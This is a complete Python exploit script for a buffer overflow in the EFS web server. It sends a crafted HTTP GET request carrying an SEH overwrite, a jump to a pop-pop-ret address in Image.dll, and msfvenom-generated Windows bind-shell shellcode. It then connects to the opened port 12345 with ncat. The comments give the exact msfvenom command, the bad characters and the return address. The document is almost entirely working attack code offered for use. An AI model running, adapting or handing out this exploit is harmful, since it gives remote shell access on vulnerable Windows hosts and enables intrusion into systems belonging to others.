#!/usr/bin/python
# Exploits EFS with a bind shell on port 12345
# Bad Characters are x00\x20\x25\x2b\x2f\x5c
# We are using 0x100228ff in Image.dll
# msfvenom -p windows/shell_bind_tcp LPORT=12345 -n 20 -f python -a x86 --platform windows -b '\x00\x20\x25\x2b\x2f\x5c' -v shelled
# Payload size: 375 bytes
# Works across all Windows platforms
# Bask in shell :)

from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
from struct import pack
from time import sleep
from subprocess import call

host = argv[1]

shelled =  ""
shelled += "\x93\x99\x9f\xd6\x3f\x9f\xf9\x92\x49\xd6\x40\xfd"
shelled += "\x40\x9b\xfc\x37\x49\x48\x42\xfc\xda\xdd\xbd\x91"
shelled += "\xe8\x53\xdd\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53"
shelled += "\x31\x6a\x17\x03\x6a\x17\x83\x53\xec\xb1\x28\xaf"
shelled += "\x05\xb7\xd3\x4f\xd6\xd8\x5a\xaa\xe7\xd8\x39\xbf"
shelled += "\x58\xe9\x4a\xed\x54\x82\x1f\x05\xee\xe6\xb7\x2a"
shelled += "\x47\x4c\xee\x05\x58\xfd\xd2\x04\xda\xfc\x06\xe6"
shelled += "\xe3\xce\x5a\xe7\x24\x32\x96\xb5\xfd\x38\x05\x29"
shelled += "\x89\x75\x96\xc2\xc1\x98\x9e\x37\x91\x9b\x8f\xe6"
shelled += "\xa9\xc5\x0f\x09\x7d\x7e\x06\x11\x62\xbb\xd0\xaa"
shelled += "\x50\x37\xe3\x7a\xa9\xb8\x48\x43\x05\x4b\x90\x84"
shelled += "\xa2\xb4\xe7\xfc\xd0\x49\xf0\x3b\xaa\x95\x75\xdf"
shelled += "\x0c\x5d\x2d\x3b\xac\xb2\xa8\xc8\xa2\x7f\xbe\x96"
shelled += "\xa6\x7e\x13\xad\xd3\x0b\x92\x61\x52\x4f\xb1\xa5"
shelled += "\x3e\x0b\xd8\xfc\x9a\xfa\xe5\x1e\x45\xa2\x43\x55"
shelled += "\x68\xb7\xf9\x34\xe5\x74\x30\xc6\xf5\x12\x43\xb5"
shelled += "\xc7\xbd\xff\x51\x64\x35\x26\xa6\x8b\x6c\x9e\x38"
shelled += "\x72\x8f\xdf\x11\xb1\xdb\x8f\x09\x10\x64\x44\xc9"
shelled += "\x9d\xb1\xf1\xc1\x38\x6a\xe4\x2c\xfa\xda\xa8\x9e"
shelled += "\x93\x30\x27\xc1\x84\x3a\xed\x6a\x2c\xc7\x0e\xa4"
shelled += "\x94\x4e\xe8\xae\xf6\x06\xa2\x46\x35\x7d\x7b\xf1"
shelled += "\x46\x57\xd3\x95\x0f\xb1\xe4\x9a\x8f\x97\x42\x0c"
shelled += "\x04\xf4\x56\x2d\x1b\xd1\xfe\x3a\x8c\xaf\x6e\x09"
shelled += "\x2c\xaf\xba\xf9\xcd\x22\x21\xf9\x98\x5e\xfe\xae"
shelled += "\xcd\x91\xf7\x3a\xe0\x88\xa1\x58\xf9\x4d\x89\xd8"
shelled += "\x26\xae\x14\xe1\xab\x8a\x32\xf1\x75\x12\x7f\xa5"
shelled += "\x29\x45\x29\x13\x8c\x3f\x9b\xcd\x46\x93\x75\x99"
shelled += "\x1f\xdf\x45\xdf\x1f\x0a\x30\x3f\x91\xe3\x05\x40"
shelled += "\x1e\x64\x82\x39\x42\x14\x6d\x90\xc6\x24\x24\xb8"
shelled += "\x6f\xad\xe1\x29\x32\xb0\x11\x84\x71\xcd\x91\x2c"
shelled += "\x0a\x2a\x89\x45\x0f\x76\x0d\xb6\x7d\xe7\xf8\xb8"
shelled += "\xd2\x08\x29"

crash = "A" * 4061
crash += "\xeb\x06\x90\x90"
crash += pack('<L', 0x100228ff)
crash += "D" * (5500 - 4061 - 4 - 4 - len(shelled))
crash += shelled

payload = 'GET {} HTTP/1.0\r\n\r\n'.format(crash)

print '[+] Trying to exploit {}...'.format(host)
try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, 80))
        print '[>] Sending payload...'
        s.send(payload)
        s.close()
        print '[>] Trying to connect to target...\n'
        try:
                sleep(2)
                call(['ncat', host, '12345'])
        except:
                print '[!] Whoops!! Something went wrong?'
except:
        print '[!] Whoops!! Something went wrong?'
finally:
        print '\n[>] I heart shells!'
